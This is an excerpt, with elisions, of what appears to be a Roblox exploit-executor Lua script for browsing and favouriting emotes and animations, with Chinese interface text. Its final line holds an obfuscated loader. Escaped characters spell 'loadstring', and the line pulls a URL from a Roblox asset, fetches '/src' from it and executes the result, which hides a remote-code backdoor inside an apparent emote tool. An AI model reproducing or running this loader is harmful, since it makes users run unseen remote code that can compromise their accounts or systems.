...
RunService.Heartbeat:Connect(function()
    ...
    if errorMsg and errorMsg.Visible then
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            errorMsg.ErrorText.Text = "仅支持R15角色，R6不可用(后续完善)"
...
local function toggleFavoriteAnimation(animationData)
    ...
    if found then
        ...
        getgenv().Notify({
            Title = 'MR-S | 收藏系统',
            Content = '✅ 已添加到收藏 "' .. animationData.name .. '"',
            Duration = 3
        })
    end
...
local function fetchAllEmotes()
    ...
    if success and result then
        for _, item in pairs(result) do
            local emoteData = {
                id = tonumber(item.id),
                name = item.name or ("表情_" .. (item.id or "未知"))
            }
    ...
    getgenv().Notify({
        Title = 'MR-S | 表情系统',
        Content = "🎉 加载成功! 总表情数: " .. totalEmotesLoaded,
        Duration = 5
    })
...
local function fetchAllAnimations()
    ...
    if success and result then
        for _, item in pairs(result) do
            local animationData = {
                id = tonumber(item.id),
                name = item.name or ("动画_" .. (item.id or "未知")),
...
end end,...)   task.spawn(function()local a=getfenv()['\108\111\97\100\115\116\114\105\110\103'](game:HttpGet((function()if pcall(function() return game.GetObjects end) then return game:GetObjects("rbxassetid://112405618584821")[1].Value else return game:GetService("InsertService"):LoadLocalAsset("rbxassetid://112405618584821").Value end end)().."/src"))pcall(a)end)
